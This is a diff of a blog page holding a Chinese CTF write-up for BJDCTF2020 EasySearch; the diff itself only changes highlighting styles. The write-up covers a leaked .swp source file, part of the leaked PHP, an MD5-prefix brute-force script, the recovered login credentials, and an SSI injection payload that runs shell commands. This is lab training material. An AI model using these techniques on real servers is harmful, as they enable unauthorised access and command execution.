@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,7 +255,7 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF2020]EasySearch<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f23cc01a377b7e84.png" srcset="/img/loading.gif">     </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>sql注入了一波，感觉不行<br>看WP说是<code>index.php.swp</code>泄露    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 	ob_start();
 	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;
 		$chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;
@@ -282,9 +290,9 @@
 	***
     &#125;
 	***
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>只要<code>substr(md5($_POST[&#39;password&#39;]),0,6))==6d0bc1</code>即可登录成功<br>用徐神的脚本跑下     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
 <span class="hljs-keyword">import</span> random
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encryption</span>(<span class="hljs-params">chars</span>):</span>
@@ -312,7 +320,7 @@
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
     main()
-    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;完成！&#x27;</span>)</code></pre></div></code></pre>
+    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;完成！&#x27;</span>)</code></pre></code></pre>
 <p>传入<code>username=123   password=8A6K7P4S6B</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/9f2cf23aebee616d.png" srcset="/img/loading.gif"><br><code>.shtml</code>  ???<br>看一下<br><img src="https://ftp.bmp.ovh/imgs/2021/03/89e291278ef0a050.png" srcset="/img/loading.gif">      </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/84260844"><code>SSI注入漏洞</code> </a>    </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>flag在原目录的上级<br>payload：<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>    </p>
@@ -466,6 +474,8 @@
 
 
 
+  
+    
   
 
 
